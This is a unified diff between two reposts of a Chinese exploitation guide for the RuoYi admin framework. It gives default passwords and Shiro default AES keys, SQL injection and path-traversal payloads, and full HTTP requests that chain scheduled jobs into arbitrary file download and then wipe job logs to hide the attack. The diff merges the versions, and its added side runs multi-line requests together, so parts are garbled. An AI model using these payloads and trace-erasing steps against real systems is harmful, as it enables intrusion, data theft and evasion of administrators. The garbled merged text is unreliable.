@@ -1,32 +1,43 @@
 #  若依(RuoYi)框架漏洞战争手册   
-网安探索员  网安探索员   2025-05-07 12:00  
+Locks_  神农Sec   2025-05-09 01:04  
   
-**原文链接：****https://forum.butian.net/share/4328**  
+扫码加圈子  
+  
+获内部资料  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
   
   
-当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。  
+![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
+  
+  
+#   
+  
+网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
+不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
+#   
+  
+原文链接：  
+https://forum.butian.net/share/4328  
+  
+作者：  
+Locks_  
+  
 # 0x00 前言  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVSchaczm8iaoTxZ4TG2RnatsBxJygLgn7zUmJjhak4TSFboIy92vQicrw/640?wx_fmt=png&from=appmsg "")  
+当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNup3Xmj8Y8ibLjLia8yZhxVQfXwgYmqk8GLpjtibyuV7n3hPwOk7ASD5IA/640?wx_fmt=png&from=appmsg "")  
 ## 简介  
   
 Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。  
   
 若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVhUsqY5vWJ3nS7I6iccq5V5vvFIvFicRIBfHXgc5fKNe3244dKVdicvtjQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNPWMOH8yvUibrtKfkXicOiaXfMiboXZvSXqAmg3R8AQhZtxDbjsky2UViaLw/640?wx_fmt=png&from=appmsg "")  
 ## 配合ruoyi的服务：  
 ```
-alibaba druid          
-alibaba nacos          
-spring            
-redis            
-mysql            
-minio            
-fastjson            
-shiro            
-swagger-ui.html          
-mybatis
+alibaba druid          alibaba nacos          spring            redis            mysql            minio            fastjson            shiro            swagger-ui.html          mybatis
 ```  
 ## 搜索语法  
   
@@ -46,36 +57,33 @@ web.body="若依后台管理系统"
 git clone https://gitee.com/y_project/RuoYi
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVgNzvD9onWpww8wmftbjO8uClLWlS8gTyZOEAeoA3tMc5kQJcHemHiag/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNU1PChCr4f2vick5hd7wurcMpUvWkRmNjf9l6NKJ9Y5CzVMWeJSa5NBw/640?wx_fmt=png&from=appmsg "")  
 ```
-cd RuoYi 
-切换版本
-git tag -l
-切换
-git checkout v4.5.1
+cd RuoYi 切换版本git tag -l切换git checkout v4.5.1
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVicTzB6flldNKTCPL4dC2bNFYjuzFdyccwHfBliaCmQ96HiaVkyU8TtgHA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN0EcE280CuMM2HF7fJtgcEFSM4I8SnDupZJZLicRlib3icic78uMibibWhDDA/640?wx_fmt=png&from=appmsg "")  
   
   
 接下来用idea搭建的  
+  
 mysql正常用phpstudy搭建就行  
+  
 日志存放路径需要修改  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVVAXRx03v2Y5hTrVPoZlqNUkib8ibibTMC4dNKt9xfG5FKFZwrn1J6sjIg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNKMh2pqqznsp8wWreyNwfLsm5OH1sB2HiaIAOClnosvsU6j22IibhO4AA/640?wx_fmt=png&from=appmsg "")  
   
 配置mysql  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVCKDNfohgwiaOCqdBThEIvuqKOLC51Dx1XRBouGyibcejDxFxbqiau0JlQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN1WbarhvtMoic4CfURicCdSlXT81hbuTNLpOOz9RI1VibzPx0JeYksxtFA/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVtJvTrcQdxukTuVAiaUC4MoBWJWgvS1KzNTeXib9OibQj5WJtM7m2oFTmA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN4jibx7pFWMWkbM8zyAE2VZVoPNlA8tWTQsQREF8Sc63LNeXzssSISzQ/640?wx_fmt=png&from=appmsg "")  
   
   
 启动即可，默认端口80  
 # 0x01 弱口令  
 ```
-用户：admin ruoyi druid            
-密码：123456 admin druid admin123 admin888
+用户：admin ruoyi druid            密码：123456 admin druid admin123 admin888
 ```  
 # 0x02 Shiro默认密钥  
 ## 漏洞简介  
@@ -88,28 +96,31 @@ RuoYi<V-4.6.2
   
 在配置文件中，能够看到shiro的密钥是在配置文件中的  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVawmmy3YqichMQC1IJAO5EW8XdAOBakibu1Veqk8zaHFOsXicxqYCfsF6Q/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNhR5cnW8H8VgBvoyGiaXN22dBQ3JniczBcaXyibqQJum86KUd08HHsmiagg/640?wx_fmt=png&from=appmsg "")  
   
 漏洞利用工具地址  
+  
 https://github.com/SummerSec/ShiroAttack2  
 - RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。  
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVk52b3udTFStuInib1fMW2rNvIM7VYRJcqzVYoDt8O5G0yqBfvAL0m1g/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNBnkpYXv0lc805qteHjsvMP4H1FzI9mic3EVTpfU27Qkw2lFKGofVCVw/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV2wRWXHOjkNQ8yqAHgjgSGSHCFRVxcoUFBH0XrsQqXiaGX8NdeK5BUZw/640?wx_fmt=png&from=appmsg "")  
-<table><tbody><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">RuoYi 版本号</span></span></strong></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">对象版本的默认AES密钥</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">4.6.1-4.3.1</span></span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">zSyK5Kp6PZAAjlT+eeNMlg==</span></span></p></td></tr><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">3.4-及以下</span></span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: var(--color-fg-default);font-size: 16px;"><span leaf="">fCq+/xW488hMTCD+cmJ3aQ==</span></span></p></td></tr></tbody></table>- RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNccribdlO2CRlqo5pq3VSzx9Ovic0MXavt37NNxVaa8F7pZ8kBTv4eQJw/640?wx_fmt=png&from=appmsg "")  
+<table><tbody><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">RuoYi 版本号</span></span></strong></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><strong><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">对象版本的默认AES密钥</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">4.6.1-4.3.1</span></span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">zSyK5Kp6PZAAjlT+eeNMlg==</span></span></p></td></tr><tr style="height: 33px;"><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;background-color: rgb(246, 248, 250);"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">3.4-及以下</span></span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;background-color: rgb(246, 248, 250);"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(36, 41, 47);font-size: 16px;"><span leaf="">fCq+/xW488hMTCD+cmJ3aQ==</span></span></p></td></tr></tbody></table>- RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。  
 # 0x03 SQL注入  
 ### 注入点1 /role/list接口 （<V-4.6.2）  
   
 版本同上4.5.1  
+  
 首先从源码分析一波  
+  
 Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVsuHLxTic3ChBtRVURV7lIJHIOEUY1jfbglKnIGuv1UiaW24WUteMnWVw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN4HPq89OIkIRoksGDiapaklJra6l2OIj4F9ytz41PNnw4icT4PD110g0Q/640?wx_fmt=png&from=appmsg "")  
   
   
 跳转  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVtyiaxEEoiaAo68glL2Je5kjymKj4ibULiaEwL4vwZJwwbhE3S9RR4r9vVQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNFibeqmO2YZUiaVMkuRSMMKfUU222Gb2Nla69ly5kicaAygjhiaKBDwWzqA/640?wx_fmt=png&from=appmsg "")  
   
   
 解释一下 ${params.dataScope}  
@@ -128,32 +139,32 @@ dataScope的值可以是一个根据用户角色动态生成的SQL片段，如
   
 进入mapper层  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTViayZ2vmjrvxa7NUplhANgTEMTzI1b8OERrkKFexRWEc4XHv5ps3RNwQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNAIyMZ3vMPR6NDYAtU8ibfFrNod4YS5GvQCZbev5N6EAJXK8yZCZXJgQ/640?wx_fmt=png&from=appmsg "")  
   
 跳转到上级  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV3EGetnhpUFbU12FCSJqHMkfjoWbejNPdfgB5A0pLXOx68qJjsCQ2oQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNaEDG60ZN3R05yGSYU46icyx5bzlU5oyXSArSL5j2ibFaUUibjNy6CeOpA/640?wx_fmt=png&from=appmsg "")  
   
   
 进入role查看信息  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVG4hhvQATEPFibDViayu8BspfVFmOSwR4Dcs9gOKLxQVHgPibs093DAmeQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN9Kiab7gVgwHDEv0nJWL2m0LUpMX77Jsmm799d4bf13HALowLT0exYYg/640?wx_fmt=png&from=appmsg "")  
   
   
 查看功能  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV0Pgic08RMYUYEjZPzehodhQ4nLwpo3TIrjXKu218ibmDM5ibg7G2lFsrQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN6zBoo8sJpwjKxolqiaQCjib1ibqVnYuLd3DicXcicOejkHdyMtP9ib1E2Tnw/640?wx_fmt=png&from=appmsg "")  
   
   
 params  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV9Lt0tDdibbic8ndn2hhJAUr7fQia3MVkmN6h6cNDIoib3wbe7j936p3Z7Q/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN5gtoibB04aKpnSDI8GiaqmsRCia2PZAX6kFDfcXR16SK8IvAErnUDl2AA/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVbgyVxt9C4riaF0wslezibn2SnelGM6q8DBx5ibb4tIicDW8J5Tdzm4UGsA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNCLy4l4ibWSUvgp74qXWcIyXkckJW2Yslzlv2lsibJCNxtBKEPicHG40dg/640?wx_fmt=png&from=appmsg "")  
   
 根据路径  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVwWC78THsPDIRpN6L5tfsEvW3f7rM8us2sqNibiahvNfnicJY9ZejqpJKQ/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNaiaBPRlVeFlGXicHpEZCr0cfDPEUXf6r9WicnYqDSVkddhicibOcWZ2HexA/640?wx_fmt=png&from=appmsg "")  
   
   
 执行代码  
@@ -161,7 +172,7 @@ params
 &params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVYywfyhJkLUFL5vECVrDbdianE8q8eNw0K0ibw6t7GDGvE9yibLKwEYJXg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNIAsKzicZACu9fMQd562pPiaDzib6h8LiatqIj18NeKlFibU1QDiagcX201qg/640?wx_fmt=png&from=appmsg "")  
 ### 注入点2 /role/export （<V-4.6.2）  
 ### 注入点3 /user/list （<V-4.6.2）  
 ### 注入点4 /user/list （<V-4.6.2）  
@@ -175,6 +186,7 @@ DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(
 ### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）  
   
 参考  
+  
 https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93  
 # 0x04 CNVD-2021-01931任意文件下载  
 #### 漏洞简介  
@@ -186,17 +198,18 @@ RuoYi<4.5.1
 #### 漏洞复现  
   
 用4.5.0版本  
+  
 直接搜索关键字，download找到具体的controller  
+  
 路径  
 ```
 /common/download/resource
 ```  
 ```
-/common/download/resource?resource=/profile/../../../../etc/passwd
-/common/download/resource?resource=/profile/../../../../Windows/win.ini
+/common/download/resource?resource=/profile/../../../../etc/passwd/common/download/resource?resource=/profile/../../../../Windows/win.ini
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVwkR047CyIenwQzgMSjnahSHsdctAFUeCia0Os6zOY9icyPpaOVgOm8Zw/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNwFbEPEL9pbodZUlibpyK5t72mHNeIA17eoajMKjlax2noP1bx2VlOjQ/640?wx_fmt=png&from=appmsg "")  
 # 0x05 CVE-2023-27025 若依任意文件下载  
 ## 漏洞简介  
   
@@ -223,16 +236,7 @@ JSESSIONID
 ## 漏洞复现  
 #### 添加任务绕过白名单（自定义下载文件路径）  
 ```
-POST /monitor/job/add HTTP/1.1
-Host: 10.40.107.67
-Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
-Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
-Content-type: application/x-www-form-urlencoded
-Content-Length: 214
-Connection: close
-
-createBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
+POST /monitor/job/add HTTP/1.1Host: 10.40.107.67Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 214Connection: closecreateBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
 ```  
 - 通过调用  
 ruoYiConfig.setProfile()  
@@ -243,16 +247,7 @@ ruoYiConfig.setProfile()
 - 此操作绕过了下载功能原本的“固定目录白名单”限制，将下载路径指向自定义位置。  
 #### 执行定时任务（触发配置修改）  
 ```
-POST /monitor/job/run HTTP/1.1
-Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
-Host: 10.40.107.67
-Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
-Content-type: application/x-www-form-urlencoded
-Content-Length: 9
-Connection: close
-
-jobId=117
+POST /monitor/job/run HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 9Connection: closejobId=117
 ```  
 - 立即执行  
 jobId=117  
@@ -264,25 +259,13 @@ ruoYiConfig.setProfile()
 - 修改后，系统将从新的配置路径（攻击者指定路径）读取文件。  
 #### 清理任务日志（擦除攻击痕迹）  
 ```
-POST /monitor/jobLog/clean HTTP/1.1
-Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
-Host: 10.40.107.67
-Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
-Content-type: application/x-www-form-urlencoded
-Content-Length: 0
-Connection: close
+POST /monitor/jobLog/clean HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 0Connection: close
 ```  
 - 删除任务执行日志，避免管理员发现恶意任务记录。  
 - 此步骤非漏洞必要环节，但常用于隐蔽攻击行为。  
 #### 触发任意文件下载  
 ```
-GET /common/download/resource?resource=2.txt HTTP/1.1
-Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
-Host: 10.40.107.67
-Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
-Connection: close
+GET /common/download/resource?resource=2.txt HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: close
 ```  
 - 下载功能仅校验“配置文件中的路径”，未对动态修改后的路径进行二次白名单校验。  
 ## bypass  
@@ -344,88 +327,93 @@ http://doc.ruoyi.vip(opens new window)
 https://gitee.com/y_project/RuoYi(opens new window)  
 使用phpstudy启动mysql  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVcfTQEPQb61g48LVYASWXdrVWJS5qhVWvia6Q79QIfVl7ibKtUhdaEthg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN53Mjo2jriaiaiblgTx1kH2fUqib38AP9x1DljW5SgGIEYpZIDF9jkKJAWg/640?wx_fmt=png&from=appmsg "")  
   
 创建数据库ry  
   
 导入sql到ry数据库中  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVqBBOzQKSjicdWFWd2GuYY6WpyTWHfpc9mls6oS7wicKudssa5ict2I4JA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxN9grsnUrUEbsYicreNuKvVcPaWJnGouzia20rNIQaGTbaDaAqPecR6mow/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVdA710Q9UGtiaibfUrlINmPwSpkZdicfcnGUBda5RXb7GaNt3F8TSCTiblg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNjmZL8ym7EYy9BI9wXJH2G8icibjzR1IwCpz56pAX4K63ZiaWoEVibDOLVw/640?wx_fmt=png&from=appmsg "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVN5C1zic03eicnzc1YGaA5EvR8uf5cqhxHNFnia2EiagsaxSp7kLqMmSXiag/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNu0UuWmH9xNEpPl6LIHUJgNib0NIQpcRRTNnA9rwvpx5ibZ4q2Lu2Taicg/640?wx_fmt=png&from=appmsg "")  
   
 将ruoyi-admin下的application-druid.yml文件配置数据库账号密码  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVCYYkP27oDiceM7BIK1Llo3MU2TxxoGdMRribtTX8IUOvqWoHRxOpABqg/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNibqwZXtLNGtNYbas2IYQAQQ0xkrk4BH6aUxIWj46xrPWZfHlswAVCDg/640?wx_fmt=png&from=appmsg "")  
   
 启动成功  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTV2w6FrIh7r6kzQlGezWbJnXtVQBlmpH1uGpk1ibyZpkCuHeuiayqynFhA/640?wx_fmt=png&from=appmsg "")  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXJ8reQFglz7znmQhDM8vxNW2ibb1Wt3SW8ICc5XVQkfmdic40oA0l0MPBWrMfNibgt3R9McFRj0jX0Q/640?wx_fmt=png&from=appmsg "")  
   
   
 若依漏洞复现环境搭建成功  
 ```
-admin
-admin123
+adminadmin123
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/CSyEGWNz8ktxCPFhOkmbgFxa7OaF7rTVxnxZSk1qSfZ6ITmt8Y3ZCbf8ibLWhQwC1fwnNRVxMAWYibbsFwN8BVDg/640?wx_fmt=png&from=appmsg "")  
